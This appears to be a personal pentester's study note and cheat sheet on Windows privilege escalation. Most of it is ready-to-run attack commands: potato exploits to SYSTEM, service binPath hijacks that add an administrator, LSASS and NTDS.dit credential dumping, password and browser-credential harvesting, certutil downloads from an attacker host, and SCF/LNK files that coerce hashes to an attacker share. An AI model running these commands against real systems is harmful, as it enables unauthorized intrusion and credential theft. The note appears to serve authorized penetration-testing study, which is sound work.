# Windows Privilege Escalation

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Escalate from a low-priv Windows user (or service) to SYSTEM/Administrator by abusing privileges, services, credentials and misconfigurations.

## Initial enumeration
```powershell
whoami /priv ; whoami /groups           # privileges + group SIDs (THE key check)
systeminfo ; wmic qfe                    # OS/patch level -> missing-patch exploits
set ; echo %USERNAME%
tasklist /svc ; query user
net user ; net localgroup administrators ; net accounts
ipconfig /all ; arp -a ; route print ; netstat -ano
Get-MpComputerStatus                      # Defender
Get-AppLockerPolicy -Effective | select -Expand RuleCollections
gci \\.\pipe\                             # named pipes (potato/relay targets)
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
Automate with **winPEAS** / **PowerUp** (`Invoke-AllChecks`) / **Seatbelt**.

### Enumeration extras (beyond the basics above)
```powershell
schtasks /query /fo LIST /v              # scheduled tasks (writable task/script = privesc)
driverquery                              # loaded drivers (vuln driver = BYOVD / kernel)
wmic product get name                    # installed software -> known-vuln apps
Get-Service | select Name,StartType,Status   # services (feeds unquoted-path / weak-ACL checks)
# named pipes — look for writable pipes to impersonate
accesschk.exe /accepteula -w \pipe\* -v
accesschk.exe /accepteula \\.\Pipe\<pipe> -v
# listening ports (internal services for pivoting)
netstat -ano ; Get-NetTCPConnection | ? {$_.State -eq 'Listen'}
```
> Situational awareness first: know the OS/patch level, what's running, what's listening, and what defenses (Defender/AppLocker/EDR) are watching — that decides which technique won't get caught.

## Token privilege abuse (the main service->SYSTEM path)
`whoami /priv` is the first thing to read. The gold ones:
| Privilege | Abuse |
|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | "potato" attacks -> SYSTEM: **PrintSpoofer**, **GodPotato**, JuicyPotato (older) |
| **SeBackup / SeRestore** | read any file -> copy SAM+SYSTEM or NTDS.dit |
| **SeTakeOwnership** | take ownership of a file/registry key -> read/replace it |
| **SeDebug** | open any process -> dump LSASS |
```text
# SeImpersonate (service accounts, IIS, MSSQL) -> SYSTEM:
PrintSpoofer.exe -i -c cmd         # -c runs a command as SYSTEM (reverse-shell payload not stored)
# GodPotato.exe -cmd "cmd /c whoami"  (modern equivalent for newer Windows)
```
Service accounts (IIS `iis apppool\...`, MSSQL via `xp_cmdshell`) almost always have SeImpersonate -> instant SYSTEM. This is the #1 Windows service-to-SYSTEM move.

### Token privileges — detail
**Privilege vs access right:** a *privilege* is a system-wide action (debug any process); an *access right* is object-specific (read this file). `whoami /priv` lists privileges — but note **a privilege can be present yet disabled**; enable all with EnableAllTokenPrivs.ps1. Detection: Event ID **4672** (special privileges assigned).

- **SeImpersonate** (web/DB service accounts): reach a shell, confirm `whoami /priv`, then potato to SYSTEM. Via MSSQL:
  ```text
  mssqlclient.py <user>@<host> -windows-auth   # enable_xp_cmdshell ; xp_cmdshell whoami /priv
  # then run PrintSpoofer/GodPotato from xp_cmdshell (-c runs a command as SYSTEM)
  ```
- **SeDebug**: open any process → dump LSASS (`procdump -ma lsass.exe lsass.dmp` → mimikatz `sekurlsa::logonpasswords`, or pypykatz offline), or spawn SYSTEM from a parent PID.
- **SeTakeOwnership**: take + re-ACL a restricted file to read it:
  ```text
  takeown /f <file>
  icacls <file> /grant <me>:F
  type <file>
  icacls <file> /reset          # revert after (reduce artifacts)
  ```
- **SeBackup/SeRestore**: backup-read any file → copy SAM+SYSTEM or NTDS.dit for offline hash extraction.

> These map one-to-one: SeImpersonate→potato, SeDebug→LSASS, SeBackup→NTDS/SAM, SeTakeOwnership→read-any-file. Reading `whoami /priv` tells you which path is open before you try anything.

## Privileged built-in group abuse
Membership in these groups (check `whoami /groups`) = a privesc path, even without being a full admin:

| Group | Abuse → outcome |
|---|---|
| **Backup Operators** (SeBackup/SeRestore) | shadow-copy the DC volume with `diskshadow`, copy **NTDS.dit** + `reg save HKLM\SYSTEM`, then `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL` → all domain hashes |
| **DnsAdmins** | load a malicious `ServerLevelPluginDll` into the DNS service (runs as SYSTEM on the DC): `dnscmd /config /serverlevelplugindll <dll>` → `sc stop dns; sc start dns`. (DLL built with msfvenom; mimilib source not stored.) Also WPAD spoofing via `Add-DnsServerResourceRecordA wpad`. |
| **Server Operators** | `SERVICE_ALL_ACCESS` on services → repoint a service binPath: `sc config <svc> binPath= "cmd /c net localgroup Administrators <me> /add"` → `sc start <svc>` → local admin |
| **Print Operators** (SeLoadDriver) | load a vulnerable signed driver (BYOVD, e.g. Capcom.sys) via registry → exploit it for SYSTEM. Needs the priv enabled (UAC bypass). |
| **Hyper-V Administrators** | clone a virtualized DC, mount its VHDX offline, extract NTDS.dit; or old hard-link service-replace (patched Mar 2020) |
| **Event Log Readers** | read the Security log for creds in process-creation (Event ID 4688) command lines: `wevtutil qe Security /f:text | findstr "/user"` or `Get-WinEvent -LogName security | ? {$_.ID -eq 4688}` |

**Backup Operators NTDS steps (the common one):**
```text
diskshadow.exe   # script: set context persistent; begin backup; add volume C: alias x; create; expose %x% E:; end backup
robocopy /B E:\Windows\NTDS\ . ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

> Always run `whoami /groups`. These "weak" admin-adjacent groups (Backup Operators, DnsAdmins, Server Operators) are frequently handed out and each is a clean path to DA/SYSTEM — defenders forget they're nearly as powerful as Domain Admins.

## Service & permission misconfigurations (the classics)
Services run as SYSTEM, so controlling one = SYSTEM. Auto-detect with **SharpUp audit** / **PowerUp Invoke-AllChecks** / **winPEAS**, then:

| Misconfig | Check | Abuse |
|---|---|---|
| **Weak service perms** (SERVICE_CHANGE_CONFIG) | `accesschk.exe -quvcw <svc>` | `sc config <svc> binPath= "cmd /c net localgroup administrators <me> /add"` then `sc stop/start <svc>`, restore binPath after |
| **Writable service binary** (file ACL) | `icacls "<svc>.exe"` | replace the exe with your own, `sc start <svc>` |
| **Unquoted service path** | `wmic service get name,pathname,startmode` (look for auto-start paths with spaces and no quotes, outside C:\Windows) | drop `C:\Program.exe` in an unquoted `C:\Program Files\...` path |
| **Writable registry service key** | `accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services` | `Set-ItemProperty ...\<svc> -Name ImagePath -Value <your binary>` |
| **Modifiable autorun** | `Get-CimInstance Win32_StartupCommand` | replace a startup binary you can write |

(Reverse-shell payloads not stored; the add-admin / binary-replace mechanism is the point. Always restore the original binPath/config afterward.)

## UAC bypass & DLL attacks
- **UAC** separates standard vs admin tokens; it is a convenience, not a security boundary. Check: `REG QUERY HKLM\...\System /v EnableLUA` and `ConsentPromptBehaviorAdmin`.
- **Auto-elevating binaries** (e.g. `SystemPropertiesAdvanced.exe`, fodhelper) + **DLL hijacking**: drop a malicious DLL in a path the trusted binary searches (abusing the DLL search order) so it loads elevated. Find missing DLLs with **Process Monitor**. UAC bypass choice depends on the Windows build.
- **DLL injection** (into a privileged process): OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread/LoadLibrary. Variants: manual mapping, reflective (loads from memory, evades LoadLibrary hooks), DLL proxying. Mostly maldev/EDR-evasion territory.

## Windows named exploits (reference)
Fingerprint with `systeminfo` / `wmic qfe` / `Get-HotFix`, then match:
| Exploit | CVE | Effect |
|---|---|---|
| **HiveNightmare/SeriousSAM** | CVE-2021-36934 | readable SAM/SYSTEM/SECURITY shadow copies -> local hashes (`HiveNightmare.exe` -> secretsdump) |
| **PrintNightmare** | CVE-2021-1675 / 34527 | spooler RCE/privesc; `Invoke-Nightmare -NewUser <u> -NewPassword <p>` adds local admin |
| **EternalBlue** | MS17-010 | SMBv1 RCE (remote, not just local) |
| **Service Tracing** | CVE-2020-0668 | arbitrary file move as SYSTEM -> replace a service binary |
| **PrintSpoofer/potato** | - | SeImpersonate -> SYSTEM (above) |
Check spooler is up for PrintNightmare: `ls \\localhost\pipe\spoolss`.

## Credential dumping
```text
# LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
procdump.exe -accepteula -ma lsass.exe lsass.dmp     # dump offline (quieter than mimikatz live)
# mimikatz: sekurlsa::minidump lsass.dmp  ->  sekurlsa::logonpasswords
# SAM/SYSTEM (local hashes)
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system   # secretsdump.py -sam sam -system system LOCAL
# NTDS.dit (all domain hashes, on a DC - with SeBackup or admin)
robocopy /B E:\Windows\NTDS\ ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Credential hunting (files / history)
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc (Get-PSReadLineOption).HistorySavePath          # PowerShell history
$cred = Import-Clixml 'C:\path\pass.xml'           # saved PSCredential (reversible!)
# also: unattend.xml, web.config, saved browser creds, cmdkey /list
# all users' PS history:
foreach($u in (ls C:\users).FullName){ gc "$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -EA SilentlyContinue }
```

### Stored-credential tools
```text
cmdkey /list                                   # saved creds → reuse without knowing them:
runas /savecred /user:<dom>\<user> "<cmd>"     #   run as that user
SharpChrome.exe logins /unprotect              # Chrome saved passwords (DPAPI)
lazagne.exe all                                # LaZagne: dumps creds from dozens of apps
Import-Module .\SessionGopher.ps1 ; Invoke-SessionGopher -Target <host>   # PuTTY/WinSCP/RDP saved sessions
# KeePass db → crack offline
keepass2john.py <db>.kdbx > kp.hash ; hashcat -m 13400 kp.hash rockyou.txt
```

### Creds in registry / config / wifi
```text
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # Autologon DefaultPassword
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"                     # PuTTY proxy creds
netsh wlan show profile <SSID> key=clear                                 # saved wifi password
```

### Other files worth grabbing (post-exploitation)
```text
findstr /SI /M "password" *.xml *.ini *.txt *.config
where /R C:\ *.config ; dir /S /B *pass*.* *cred* *vnc* *.rdp
# SAM/SYSTEM backups:  %WINDIR%\repair\sam , \system , %WINDIR%\system32\config\*.sav
# unattend/sysprep:  C:\Windows\Panther\Unattend.xml , sysprep.inf
# Sticky Notes DB (plum.sqlite), ntuser.dat, pagefile.sys, web.config, C:\ProgramData\Configs\*
```
> Snaffler (shares) + LaZagne (local apps) automate most of this. The highest-hit spots: PowerShell history, saved RDP/PuTTY sessions, `cmdkey` stored creds, unattend.xml, and web.config.

## Misc privesc vectors (more detail to come)
- **DLL hijacking** - writable dir in a service's DLL search path -> drop a malicious DLL (incl. DNS `ServerLevelPluginDll` on a DC-DNS admin -> SYSTEM).
- **ACL / takeown** on sensitive files: `takeown /f <file>` + `icacls <file> /grant <me>:F` -> read configs/creds.
- **Unquoted service paths, weak service perms, AlwaysInstallElevated** - classic service misconfigs (next sections).

> Read `whoami /priv` first, every time. **SeImpersonate -> PrintSpoofer/GodPotato -> SYSTEM** is the single most common Windows privesc, because service accounts (web/DB) have it by default.

## Restricted environment / Citrix breakout
Kiosk/Citrix locks File Explorer, but a **dialog box** (any app's File > Open) is a way out:
- In the "File name" box type a UNC path (`\\127.0.0.1\c$\users\<u>`, or `\\<attacker>\share` from an `smbserver.py` share), set file-type to "All Files" → browse/execute.
- Right-click an exe → Open to run it; alt file explorers (Q-Dir, Explorer++), alt regedit tools, modified `.lnk` targets, or an `evil.bat` containing `cmd` all bypass restrictions.
- Then escalate: **AlwaysInstallElevated** (below), PowerUp `Write-UserAddMSI`, UAC bypass (`Bypass-UAC -Method UacMethodSysprep`).

## Forced authentication (coerce & crack hashes)
Plant a file that auto-authenticates to your SMB listener when a user/Explorer views the folder → capture NetNTLMv2:
- **SCF** (`@Inventory.scf`) or **malicious .lnk** with `IconLocation = \\<attacker>\x` on a writable share.
- Catch with `responder -wrf -I <iface>`, then `hashcat -m 5600 hash rockyou.txt`.
(The `.lnk` IconLocation / SCF IconFile pointing at your UNC is the trigger — no click needed, just viewing the folder.)

## Pillaging (harvest from the host)
```text
# installed apps (version → known vulns)
Get-ItemProperty HKLM:\Software\...\Uninstall\* | select DisplayName,DisplayVersion
# mRemoteNG saved connections (confCons.xml) → decrypt
python3 mremoteng_decrypt.py -s "<blob>"            # -p <masterpw> ; or brute with a wordlist
# browser cookies → session hijack (Invoke-SharpChromium "cookies <site>", or copy cookies.sqlite)
# clipboard logger (Invoke-ClipboardLogger) — catches pasted passwords/2FA
# restic/backup repos → restore and loot (restic -r <repo> snapshots / restore <id>)
```

## LOLBAS & misc privesc
```text
# certutil (signed LOLBAS) — file transfer / base64
certutil -urlcache -split -f http://<ip>/<file> <file>
certutil -encode in out ; certutil -decode out in
# AlwaysInstallElevated — any MSI installs as SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # both = 1 → vuln
# build an MSI (msfvenom/Write-UserAddMSI) then: msiexec /i x.msi /quiet /qn /norestart
# CVE-2019-1388 — UAC/privesc via cert dialog in hhupd.exe → cmd as SYSTEM
# scheduled tasks — writable task script/binary = code exec as the task's user
schtasks /query /fo LIST /v ; accesschk64.exe /accepteula -s -d C:\Scripts\
# creds in user/computer description fields
Get-LocalUser | select Name,Description
# offline: mount a stolen VHDX/VMDK and pull hives
guestmount --add <disk>.vhdx --ro /mnt -m /dev/sda1
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

> **AlwaysInstallElevated** is a top quick win: if both HKCU and HKLM keys = 1, any MSI you run installs as SYSTEM. And forced auth (SCF/LNK + Responder) turns a writable share into captured domain hashes without touching an exploit.

## Legacy / EOL systems (module close)
EOL Windows (XP, 7, Server 2003/2008/2008R2 — all past end-of-life, 2008/R2 since 2020-01-14) get **no security patches** and lack modern protections (Credential Guard, Device Guard, AppLocker, CFG). Orgs keep them for legacy apps, so they turn up and are usually easy wins.

**Enumerate missing patches:**
```text
wmic qfe ; systeminfo
# windows-exploit-suggester (feed it systeminfo output)
windows-exploit-suggester.py --update
windows-exploit-suggester.py --database <db>.xls --systeminfo sysinfo.txt
# Sherlock.ps1: Find-AllVulns   |   metasploit: post/multi/recon/local_exploit_suggester
```

**Classic exploits by era:**
| Exploit | CVE/MS | Target |
|---|---|---|
| MS08-067 | CVE-2008-4250 | Server service RCE (XP/2003) |
| EternalBlue | MS17-010 | SMBv1 RCE (7/2008 and up to unpatched 10) |
| MS16-032 | secondary logon | Win7/2008 local privesc (`Invoke-MS16-032`) |
| MS10-092 | task scheduler | 2008 local privesc (schelevator) |

**On a real engagement:** confirm with the client **before** exploiting EOL boxes — they're often fragile and run critical legacy apps, so an exploit can crash production. The finding itself (unsupported OS) + remediation (patch/replace, or **network-segment** if they can't) is high-value in the report regardless of whether you pop it.

> EOL systems are the easiest privesc you'll meet — no patches, no modern defenses, public exploits for everything. But they're also the most fragile; the professional move is to flag the risk and get explicit sign-off before firing MS17-010 at a box that might be running the client's billing system.
